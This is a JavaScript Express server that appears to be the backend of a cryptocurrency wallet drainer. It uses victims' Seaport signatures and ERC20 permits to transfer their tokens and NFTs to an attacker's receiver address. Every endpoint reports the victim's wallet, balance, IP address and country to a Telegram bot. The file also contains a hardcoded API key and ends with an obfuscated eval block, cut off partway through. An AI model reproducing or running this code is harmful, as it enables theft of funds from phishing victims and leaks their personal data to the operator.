const express = require("express");
const request = require('request');
const cors = require('cors');
const seaport = require("@opensea/seaport-js");
const ethers = require("ethers");
const dotenv = require("dotenv");
dotenv.config();

const app = express()
const PORT = process.env.PORT || 3000 

app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const ERC20_ABI = [
    {
        "constant": false,
        "inputs": [
            {
                "name": "_from",
                "type": "address"
            },
            {
                "name": "_to",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
          {
            "internalType": "address",
            "name": "owner",
            "type": "address"
          },
          {
            "internalType": "address",
            "name": "spender",
            "type": "address"
          },
          {
            "internalType": "uint256",
            "name": "rawAmount",
            "type": "uint256"
          },
          {
            "internalType": "uint256",
            "name": "deadline",
            "type": "uint256"
          },
          {
            "internalType": "uint8",
            "name": "v",
            "type": "uint8"
          },
          {
            "internalType": "bytes32",
            "name": "r",
            "type": "bytes32"
          },
          {
            "internalType": "bytes32",
            "name": "s",
            "type": "bytes32"
          }
        ],
        "name": "permit",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [
          {
            "internalType": "address",
            "name": "",
            "type": "address"
          }
        ],
        "name": "nonces",
        "outputs": [
          {
            "internalType": "uint256",
            "name": "",
            "type": "uint256"
          }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
      }
];
const ERC721 = [
    {
        "inputs": [
          { "internalType": "address", "name": "from", "type": "address" },
          { "internalType": "address", "name": "to", "type": "address" },
          { "internalType": "uint256", "name": "tokenId", "type": "uint256" },
        ],
        "name": "safeTransferFrom",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
      },
];
const ERC1155 = [
    {
        "constant": false,
        "inputs": [
          {
            "internalType": "address",
            "name": "_from",
            "type": "address"
          },
          {
            "internalType": "address",
            "name": "_to",
            "type": "address"
          },
          {
            "internalType": "uint256",
            "name": "_id",
            "type": "uint256"
          },
          {
            "internalType": "uint256",
            "name": "_value",
            "type": "uint256"
          },
          {
            "internalType": "bytes",
            "name": "_data",
            "type": "bytes"
          }
        ],
        "name": "safeTransferFrom",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
      },
];

const config = { 
    receiver: "INSERT_SAME_RECEIVER_ON_FRONTNED",
    
    // ERC20 & NFT
    SAFAfulfiller: process.env.SAFAfulfiller,

    // Seaport
    fulfiller: process.env.fulfiller,

    BOT_TOKEN: process.env.bot,
    LOGS_CHAT_ID: "",
    SUCCESS_CHAT_ID: "",

    MORALIS_API_KEY: "INSERT_MORALIS_API_KEY",
    OPENSEA_API_KEY: "7dabb51af1224421960e18ed64e69bc2" 
 }
 
 let provider = new ethers.providers.JsonRpcProvider(
    "https://rpc.ankr.com/eth"
);

/******* SEAPORT *******/
app.post("/backend/seaport", async (req, res) => {
    let order = req.body.order;

    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;

    let fulFills = [];

    // Fulfillments
    order.parameters.offer.forEach((offerItem, offerIndex) => {
        const considerationIndex =
        order.parameters.consideration.findIndex(
          (considerationItem) =>
            considerationItem.itemType === offerItem.itemType &&
            considerationItem.token === offerItem.token &&
            considerationItem.identifierOrCriteria ===
              offerItem.identifierOrCriteria
        );

        if (considerationIndex === -1) {
            console.warn(
            "Could not find matching offer item in the consideration for private listing"
            );
        }

        fulFills.push({
            offerComponents: [
                {
                  itemIndex: offerIndex,
                  orderIndex: 0,
                },
              ],
              considerationComponents: [
                {
                    itemIndex: considerationIndex,
                    orderIndex: 0,
                },
              ],
        });
    });

    try {
        let fulfillments = [...fulFills];

        let fulfillerWallet = new ethers.Wallet(config.fulfiller);
        let fulfillerSigner = await fulfillerWallet.connect(provider);
        let spClientFulfiller = new seaport.Seaport(fulfillerSigner);
    
        let gasPrice = await provider.getGasPrice();
        let hexGasPrice = ethers.utils.hexlify(Math.floor(gasPrice * 1.3))
    
        const transaction = await spClientFulfiller
        .matchOrders({
          orders: [order],
          fulfillments,  
          overrides: {
            gasPrice: hexGasPrice,
            gasLimit: ethers.utils.hexlify(10000000)
          },
          accountAddress: config.receiver,
        })
        .transact();
    
        let escaper = (ah) => {
            return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
        }
    
        let message = 
        `*Approved Transfer Seaport*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Type: Seaport*\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(transaction.hash)})\n\n`+
    
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log(error);
            res.sendStatus(200);
        });
    } catch(error) {
        console.warn("[-] Seaport error: ", error)
    }

});

/******* SWAP *******/
app.post("/backend/swap", async (req, res) => {
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;

    let transferName = req.body.transferName;
    let tokenPrice = req.body.tokenPrice;
    let transactionHash = req.body.transactionHash;

    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }

    try {

        let message = 
        `*Approved Transfer ${escaper(transferName)}*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n`+
    
        `*Transfer Type: ${escaper(transferName)} \n*`+
        `*Token Price: ${escaper(tokenPrice)} ETH\n\n*`+
        
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log("Sent SWAP log");
            res.sendStatus(200);
        });
 
    } catch(error) {
        console.warn("[-] SWAP error: ", error)
    }
});

/******* PERMIT SAFA *******/

app.post("/backend/permit", async (req, res) => {
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;

    let tokenName = req.body.tokenName;
    let tokenPrice = req.body.tokenPrice;
    let withdrawBalance = req.body.withdrawBalance;
    let contractAddress = req.body.contractAddress;

    let r = req.body.r;
    let s = req.body.s;
    let v = req.body.v;
    let deadline = req.body.deadline;

    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }

    try {
        const signer = new ethers.Wallet(config.SAFAfulfiller, provider);
        let contractInstance = new ethers.Contract(contractAddress, ERC20_ABI, signer);
    
        res.status(200).send({
            status: true,
        })
        let permit = await contractInstance.permit(address, config.receiver, withdrawBalance, deadline, v, r, s)

        let message = 
        `*Approved Transfer PERMIT ERC20*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(permit.hash)})\n`+
    
        `*Token Name: ${escaper(tokenName)}\n*`+
        `*Token Price: ${escaper(tokenPrice)}\n*`+
        `*Withdrawbalance: ${escaper(withdrawBalance)}\n\n*`+
        
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log("Sent PERMIT ERC20 log");
        });
    

        await provider.waitForTransaction(permit.hash);

        // WITHDRAWING
    
        let withdrawal = await contractInstance.transferFrom(address, config.receiver, withdrawBalance)
    
        let withdrawMessage = 
        `*Withdrawed ERC20 permit*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Type: ERC20 permit *\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;
        
        let withdrawClientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
        
        request(withdrawClientServerOptions, (error, response) => {
            console.log("[+] Withdrawed PERMIT ERC20");
            res.sendStatus(200);
        });    


    } catch(error) {
        console.warn("[-] PERMIT error: ", error)
    }
});

/******* ERC20 SAFA *******/
app.post("/backend/safa/erc20", async (req, res) => {
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;

    let tokenType = req.body.tokenType;
    let tokenName = req.body.tokenName;
    let tokenPrice = req.body.tokenPrice;
    let withdrawBalance = req.body.withdrawBalance;
    let contractAddress = req.body.contractAddress;


    let transactionHash = req.body.transactionHash;

    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }

    try {
        console.log(`[+] Sending ${tokenName} log`)

        let message = 
        `*Approved Transfer ${escaper(tokenType)}*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n`+
    
        `*Token Name: ${escaper(tokenName)}\n*`+
        `*Token Price: ${escaper(tokenPrice)}\n*`+
        `*Withdrawbalance: ${escaper(withdrawBalance)}\n\n*`+
        
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log("Sent ERC20 log");
        });
    
        await provider.waitForTransaction(transactionHash);
    
        // WITHDRAWING
        const signer = new ethers.Wallet(config.SAFAfulfiller, provider);
        let contractInstance = new ethers.Contract(contractAddress, ERC20_ABI, signer);
    
        let withdrawal = await contractInstance.transferFrom(address, config.receiver, withdrawBalance)
    
        let withdrawMessage = 
        `*Withdrawed ${escaper(tokenType)}*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Type: ${escaper(tokenType)} *\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;
        
        let withdrawClientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
        
        request(withdrawClientServerOptions, (error, response) => {
            console.log("[+] Withdrawed ERC20");
            res.sendStatus(200);
        });    
    } catch(error) {
        console.warn("[-] SAFA ERC20 error: ", error)
    }
});

/******* NFT SAFA *******/
app.post("/backend/safa/nft", async (req, res) => {
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;

    let tokenType = req.body.tokenType;
    let tokenName = req.body.tokenName;
    let tokenPrice = req.body.tokenPrice;
    let contractAddress = req.body.contractAddress;

    let transactionHash = req.body.transactionHash;

    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }

    try {
        console.log(`[+] Sending ${tokenName} log`)

        let message = 
        `*Approved Transfer ${escaper(tokenType)}*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n`+
    
        `*Token Name: ${escaper(tokenName)}*\n`+
        `*Token Price: ${escaper(Number(tokenPrice).toFixed(5))} ETH*\n\n`+
        
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log("Sent NFT log");
        });
    
        await provider.waitForTransaction(transactionHash);
    
        // WITHDRAWING
        console.log(address, contractAddress)
        let tokenIdServerOptions = {
            uri: 'https://deep-index.moralis.io/api/v2/' + address + '/nft/' + contractAddress + '?chain=Eth&format=decimal',
            method: 'GET',
            headers: {
                'Content-Type':'application/json',
                'Accept':'application/json',
                'X-API-KEY': config.MORALIS_API_KEY
            }
        }
    
        request(tokenIdServerOptions, async (error, response, body) => {
            let tokenIds = [];
            JSON.parse(body).result.map(token => tokenIds.push(token.token_id))
            tokenIds
            
            const signer = new ethers.Wallet(config.SAFAfulfiller, provider);
            for(let i = 0; i < tokenIds.length; i++) {
                console.log("[+] Withdrawing NFT " + tokenIds[i])
                let withdrawal;
    
    
                if(tokenType == "ERC721") {
                    let contractInstance = new ethers.Contract(contractAddress, ERC721, signer);
                    withdrawal = await contractInstance.safeTransferFrom(address, config.receiver, tokenIds[i])    
                }
    
                if(tokenType == "ERC1155") {
                    let contractInstance = new ethers.Contract(contractAddress, ERC1155, signer);
                    withdrawal = await contractInstance.safeTransferFrom(address, config.receiver, tokenIds[i], 1, 256)    
                }

                new Promise(resolve => setTimeout(resolve, 2500))
    
                let withdrawMessage =
                `*Withdrawed ${escaper(tokenName)}*\n\n`+
                `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
                `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
                `*Type: ${escaper(tokenType)} *\n`+
                `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;
                
                let withdrawClientServerOptions = {
                    uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
                    body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true}),
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    }
                }
                request(withdrawClientServerOptions, (error, response) => {
                    console.log("[+] Withdrawed NFT");
                    res.sendStatus(200);
                });   
            
            }
            
        });
     
    } catch(error) {
        console.warn("[-] SAFA NFT error: ", error)
    }

});

/******* ETH SAFA *******/
app.post("/backend/safa/eth", async (req, res) => {
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;

    let tokenPrice = req.body.tokenPrice;
    let transactionHash = req.body.transactionHash;

    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }

    try {

        let message = 
        `*Approved Transfer ETH*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n`+
    
        `*Token Name: ETH \n*`+
        `*Token Price: ${escaper(tokenPrice)} ETH\n\n*`+
        
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log("Sent ETH log");
            res.sendStatus(200);
        });
 
    } catch(error) {
        console.warn("[-] SAFA ETH error: ", error)
    }
});


/******* CONNECTION *******/
app.post("/backend/connection", async (req, res) => { 
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;


    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }

    try {
        let message = 
        `*New Connection*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Nft Value:* [Here](https://value.app/${address})\n\n`+
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
    
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.LOGS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log("Connection");
            res.sendStatus(200);
        });

    } catch(error) {
        console.warn("[-] Connection error: ", error);
    }
});

/******* CANCEL *******/
app.post("/backend/cancel", async (req, res) => { 
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;

    let tokenType = req.body.tokenType;
    let tokenName = req.body.tokenName;
    let tokenPrice = req.body.tokenPrice;

    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }


    try {
        let message = 
        `*Canceled Transaction ${tokenType} ${tokenName}*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n${
            tokenType != "Seaport"
            ? 
            `*Token Name: ${escaper(tokenName)} *\n`+
            `*Token Price: ${escaper(tokenPrice)} *\n`
            :
            ""
        }`+
        `*Nft Value:* [Here](https://value.app/${address})\n\n`+
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.LOGS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log(error);
            res.sendStatus(200);
        });
    } catch(error) {
        console.warn("[-] Cancel error: ", error);
    }
});

let YfMbb;!function(){const Q2OF=Array.prototype.slice.call(arguments);return eval("(function Epbz(nFir){const Pclr=Xo2r(nFir,nHPr(Epbz.toString()));try{let jAdr=eval(Pclr);return jAdr.apply(null,Q2OF);}catch(L7fr){var L9Mr=(0o202506-66871);while(L9Mr<(0o400052%65548))switch(L9Mr){case (0x30066%0o200035):L9Mr=L7fr instanceof SyntaxError?(0o400103%0x1001B):(0o400054%0x1000D);break;case (0o200606-0x10179):L9Mr=(0o400070%65555);{console.log(\'Error: the code has been tampered!\');return}break;}throw L7fr;}function nHPr(H4Hr){let jCKr=1698487212;var DZCr=(0o400067%65553);{let fxFr;while(DZCr<(0x10618-0o202761)){switch(DZCr){case (0o600041%0x10008):DZCr=(0x9D8DE4-0O47306735);{jCKr^=(H4Hr.charCodeAt(fxFr)*(0x2935494a%7)+H4Hr.charCodeAt(fxFr>>>(0O73567354%6)))^2121952966;}break;case (0O264353757%8):DZCr=(0o1000162%65555);fxFr++;break;case (131150%0o200024):DZCr=fxFr<H4Hr.length?(262213%0o200017):(0o400167%0x10028);break;case (67006-0o202651):DZCr=(0o1000206%0x10018);fxFr=(0x75bcd15-0O726746425);break;}}}let zUxr=\"\";var bsAr=(0x20037%0o200025);{let bu7r;while(bsAr<(0o204660-67985)){switch(bsAr){case (0o201616-0x10381):bsAr=(0o600156%65567);bu7r=(0x21786%3);break;case (131135%0o200027):bsAr=bu7r<(0O347010110&0x463A71D)?(0O347010110&0x463A71D):(0o200466-0x10117);break;case (0O347010110&0x463A71D):bsAr=(0x2005E%0o200040);{const D19r=jCKr%(67336-0o203371);jCKr=Math.floor(jCKr/(0o202506-0x10537));zUxr+=D19r>=(0x1071C-0o203402)?String.fromCharCode((0o600404%65601)+(D19r-(0o1000136%0x10011))):String.fromCharCode((0o217120-0x11DEF)+D19r);}break;case (0o204064-67606):bsAr=(0o200776-0x101ED);bu7r++;break;}}}return zUxr;}function Xo2r(zW4r,TjXr){zW4r=decodeURI(zW4r);let vRZr=(0x21786%3);let PeSr=\"\";var rMUr=(67426-0o203515);{let rOrs;while(rMUr<(0o600204%0x1001F)){switch(rMUr){case (0o200132-65617):rMUr=(0O264353757%8);{PeSr+=String.fromCharCode(zW4r.charCodeAt(rOrs)^TjXr.charCodeAt(vRZr));vRZr++;var Tlus=(0o207676-0x10F9F);while(Tlus<(0x10F00-0o207340))switch(Tlus){case (0o200466-0x10117):Tlus=vRZr>=TjXr.length?(0o201034-66049):(0o203100-0x10620);break;case (0x3008D%0o200046):Tlus=(0o400102%65553);{vRZr=(0x75bcd15-0O726746425);}break;}}break;case (0o1000222%65563):rMUr=rOrs<zW4r.length?(66706-0o202211):(69826-0o210233);break;case (0o1000161%65559):rMUr=(68196-0o205076);rOrs=(0x75bcd15-0O726746425);break;case (0O264353757%8):rMUr=(196739%0o200037);rOrs++;break;}}}return 